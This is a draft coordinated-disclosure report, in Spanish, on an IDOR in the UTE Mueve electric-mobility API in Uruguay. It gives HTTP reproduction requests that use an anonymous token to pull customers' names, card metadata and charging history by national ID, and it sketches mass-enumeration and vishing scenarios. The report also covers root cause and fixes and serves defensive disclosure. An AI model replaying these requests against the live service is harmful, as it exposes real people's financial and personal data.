# Reporte de Vulnerabilidad VR-001 — IDOR que expone PII y metadatos de tarjeta de crédito vía cédula uruguaya

> **Estado:** Borrador, todavía no divulgado a UTE.
> **Reportador:**  `<admin@checkleaked.cc>`
> **Fecha de descubrimiento:** 2026-05-20
> **Severidad (CVSS 3.1):** **9.1 / Crítica**  — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`
> **Producto:** UTE Mueve (plataforma de movilidad eléctrica de Administración Nacional de Usinas y Trasmisiones Eléctricas, Uruguay).
> **Superficie afectada:** API REST pública en `https://movilidadelectrica.ute.com.uy/api/v2`. Verificado contra APK `versionCode 9922` (`versionName 1.0.24`).

---

## 1. Resumen

`/api/v2` emite JWTs anónimos a cualquier cliente que presente un header `uniquekeyuser` auto-generado. Una vez con un token, varios endpoints user-scoped (notablemente `GET /api/v2/customer/card/{key}`) aceptan una cédula uruguaya pura como parámetro de path y devuelven el registro completo del cliente — incluyendo nombre y apellido, BIN + últimos 4 de la tarjeta de crédito vinculada a MercadoPago, fecha de expiración, marca, `payerCardId` interno de MercadoPago, cuenta RFID registrada, suscripciones a redes e historial de cargas remotas.

La cédula es un identificador nacional de 7-9 dígitos con menos de ~5 millones de valores emitidos. No se observa rate limiting en la emisión del token ni en las lecturas subsiguientes. Combinado, esto permite a un atacante enumerar toda la base de usuarios UTE Mueve uruguaya y extraer información financiera y personal suficiente para montar campañas de vishing/phishing altamente creíbles, ataques de identity-pivot y vigilancia de patrones de movilidad.

## 2. Reproducción (tres calls HTTP)

```http
POST /api/v2/token HTTP/1.1
Host: movilidadelectrica.ute.com.uy
user-agent: Dart/3.4 (dart:io)
content-type: application/json; charset=utf-8
uniquekeyuser: <CUALQUIER-13-HEX>     # generado random, NO pre-registrado

{"clientIdIDP":"cargaME","identifier":"Anonymous"}
```
Respuesta (truncada): `{ "access_token": "<JWT>", "expires_in": 3600, "token_type": "Bearer", "scope": "apiME" }`.

```http
GET /api/v2/customer/card/<CI> HTTP/1.1
Host: movilidadelectrica.ute.com.uy
authorization: Bearer <JWT>
uniquekeyuser: <mismo que arriba>
```
Forma de la respuesta (campos reales, valores saneados — ver `packages/openapi/fixtures/customer.card.example.json` para el fixture JSON):
```json
{
  "data": [
    {
      "id": "<INTERNAL_ID>",
      "cardId": "**XXXXXXXXXXXXX",
      "firstSixDigits": "<BIN>",
      "lastFourDigits": "<L4>",
      "expirationMonth": "<MM>",
      "expirationYear": "<YYYY>",
      "identifType": "CI",
      "identifNumber": "<CI>",
      "paymentMethodId": "<MARCA>",
      "firstName": "<NOMBRE>",
      "lastName": "<APELLIDO>",
      "status": "Habilitada",
      "cvvMandatory": true,
      "payerCardId": "<MP_PAYER_ID>",
      "issuerId": "<ISSUER_ID>",
      "minPay": 15,
      "cardUseType": 1,
      "cardUseTypeDesc": "Particular"
    }
  ],
  "messages": [], "success": true, "errors": [], "result": 0
}
```

Endpoints adicionales confirmados que exponen datos con el mismo contexto de autorización:
- `GET /api/v2/network/<CI>` → redes de carga habilitadas del usuario.
- `GET /api/v2/remotecharge/user/<CI>` → historial de patrones de movilidad (timestamps, estaciones, kWh, costo).
- `POST /api/v2/card/accounts/` con `{"docType":"CI","docNumber":"<CI>","onlyUte":false}` → accountId interno + referencia a cardId.

## 3. Impacto

| Tipo de dato | Expuesto sin autenticación |
|---|---|
| Membresía (¿tiene CI X cuenta UTE Mueve?) | ✅ |
| Nombre y apellido en file | ✅ |
| Marca de tarjeta | ✅ |
| BIN de tarjeta (primeros 6 dígitos del PAN) | ✅ |
| Últimos 4 del PAN | ✅ |
| Mes + año de expiración | ✅ |
| `payerCardId` de MercadoPago (pivot cross-platform) | ✅ |
| Flag `cvvMandatory` de la cuenta | ✅ |
| accountId interno | ✅ |
| Redes de carga habilitadas por usuario | ✅ |
| Sesiones de carga remota (timestamps, kWh, costo, estación/conector) | ✅ |

### Escenarios de ataque

1. **Enumeración masiva de la base UTE Mueve.** Un sweep de 5 millones de calls sobre el rango de CIs emitidos agota la superficie; a 100 req/s se completa en ~14 horas.
2. **Vishing altamente creíble.** Un atacante puede verificar nombre + marca + últimos 4 + mes/año de expiración, induciendo a la víctima a "confirmar el CVV" o "aprobar una transacción".
3. **Phishing dirigido.** Email con el nombre de la víctima + últimos 4 + contexto creíble UTE / MercadoPago.
4. **Vigilancia de patrones de movilidad** sobre figuras públicas, activistas, periodistas, jueces — el uso de UTE Mueve revela visitas a estaciones de carga con timestamps.
5. **Pivot cross-platform** vía `payerCardId` para enumerar estado de cuenta MercadoPago donde aplique.

### Exposición regulatoria

- **Ley 18.331 (Protección de Datos Personales) del Uruguay:** procesamiento y exposición no segura de identificadores nacionales y metadatos financieros, sin consentimiento, por una empresa pública.
- **Expectativas del BCU** sobre manejo de datos de instrumentos de pago bajo el Sistema Nacional de Pagos.
- **Consideraciones de equivalencia GDPR** si los clientes UTE Mueve uruguayos residen o viajan a la UE.

## 4. Causa raíz

El JWT con audiencia `apiME` no tiene claim `sub` atándolo a un usuario. El parámetro del path (`{customerKey}`) es la *única* señal de autorización en los endpoints user-scoped. El header `uniquekeyuser` es un tag opaco free-form que el servidor acepta para cualquier valor — un hex random fresco es suficiente. El endpoint de lookup (`POST /api/v2/card/accounts/`) explícitamente acepta `docType: "CI"` como modalidad de búsqueda.

## 5. Correcciones recomendadas (orden de prioridad)

1. **Inmediato (en horas):** Agregar rate limit por IP y por `uniquekeyuser` en `POST /api/v2/token` (p.ej. 60 tokens/IP/hora). Agregar rate limit por IP en `GET /customer/card/*`, `/card/accounts/*`, `/network/*`, `/remotecharge/user/*` (p.ej. 20 req/min). Rechazar valores de `uniquekeyuser` que no matchen un patrón firmado por el servidor (device key con HMAC).
2. **Corto plazo (en semanas):** Requerir tokens de usuario autenticado (validación de Firebase ID token contra el verificador del proyecto, o flow OAuth completo de usuario vía `identityserver.ute.com.uy/connect/*`) en cada endpoint user-scoped. Validar que el `customerKey` del path matchea con el `sub`/`uid` del token.
3. **Mediano plazo:** Mover los campos de datos de tarjeta/pago fuera de `GET /customer/card/{key}` (devolver solo campos seguros como `cardId` masked, marca, últimos 4). Hacer que BIN, expiración, `payerCardId`, `issuerId`, `firstName`, `lastName` estén disponibles solo vía un endpoint autenticado separado scoped al dueño.
4. **Largo plazo:** Adoptar App Check / Play Integrity en la app Flutter oficial y enforce attestation en el backend. Emitir JWTs por usuario con `sub` seteado al customer key. Audit-log de cada lookup basado en CI.

## 6. Timeline de divulgación (propuesto)

| Día | Evento |
|---|---|
| 0 (2026-05-20) | Vulnerabilidad descubierta y reproducida. Borrador de este reporte. |
| 0 – 3 | Intentos de contacto: mailbox de seguridad de UTE si existe, sino el CSIRT nacional CERTuy (`certuy.gub.uy`) y AGESIC, agencia tecnológica uruguaya. |
| 3 – 7 | Acknowledgement recibido. Reunión de triage agendada. |
| 30 | Deadline recomendado para que las mitigaciones #1 (rate limit + binding de uniquekeyuser) estén deployeadas. |
| 90 | Divulgación pública del reporte conceptual (este documento). Sin código de exploit publicado. |

## 7. Qué contiene este repositorio

- **Este reporte**, describiendo el issue conceptualmente.
- **`SECURITY.md`** / **`SECURITY.es.md`**, reporte agregado de análisis estático incluyendo este hallazgo más otros ítems de severidad menor.
- **Un puente de interoperabilidad** que maneja el ciclo de vida del token anónimo de UTE y expone los endpoints read-only a los que cualquier consumidor de la API subyacente ya tiene acceso. El puente **no** implementa ni alienta la enumeración; los endpoints user-scoped del puente requieren que el consumidor pase el customer key explícitamente.
- **Fixtures JSON saneados** ilustrando las formas de respuesta que demuestran la divulgación.

## 8. Qué NO contiene este repositorio

- Capturas en vivo con CIs reales, nombres, números de tarjeta, JWTs o valores de `payerCardId`. Todos los datos reales observados durante la investigación se usaron solo para caracterizar la forma del bug y fueron reemplazados con placeholders `<REDACTED_*>` o esquemas genéricos.
- Script de enumeración ni automatización alguna que demuestre scraping masivo.
- Cualquier tooling que baje la barrera para explotar.

## 9. Contacto

`admin@checkleaked.cc` — reportador.

Para UTE: este documento y la evidencia de soporte pueden compartirse bajo términos de divulgación coordinada bajo pedido.
